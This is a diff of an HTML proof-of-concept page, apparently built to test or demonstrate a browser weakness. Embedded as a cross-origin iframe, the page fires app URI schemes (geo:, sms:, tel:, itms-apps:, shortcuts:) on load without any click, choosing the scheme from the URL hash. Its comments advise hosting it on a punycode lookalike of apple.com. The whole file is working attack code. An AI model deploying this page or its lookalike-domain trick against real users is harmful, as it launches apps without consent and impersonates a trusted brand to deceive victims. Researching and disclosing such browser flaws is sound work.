@@ -1,1 +1,31 @@
-<!doctype html><script>setTimeout(function(){location.href='geo:37.33,-122.03'},300)</script><h3>child</h3>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>child</title>
+</head>
+<body style="font-family:system-ui;padding:10px">
+<h3>cross-origin child</h3>
+<p id="o" style="font:12px monospace"></p>
+<script>
+ // This page must be hosted on a DIFFERENT, trusted-looking origin (e.g.
+ // https://www-apple-com.xn--mgb.my.id/arc_child.html) and embedded as an
+ // iframe by the attacker page on another origin.
+ // It fires a URI-scheme navigation on load (zero-click). Scheme via #hash.
+ // Default geo:. Examples:
+ //   arc_child.html#geo:37.33,-122.03
+ //   arc_child.html#sms:
+ //   arc_child.html#tel:
+ //   arc_child.html#maps://?q=0,0
+ //   arc_child.html#itms-apps://itunes.apple.com
+ //   arc_child.html#shortcuts://
+ //   arc_child.html#https://www.apple.com/
+ var scheme = decodeURIComponent((location.hash || '#geo:37.33,-122.03').slice(1));
+ document.getElementById('o').textContent =
+   'child origin = ' + location.origin + '\nfiring: ' + scheme;
+ setTimeout(function(){
+   try { location.href = scheme; } catch (e) {}
+ }, 350);
+</script>
+</body>
+</html>
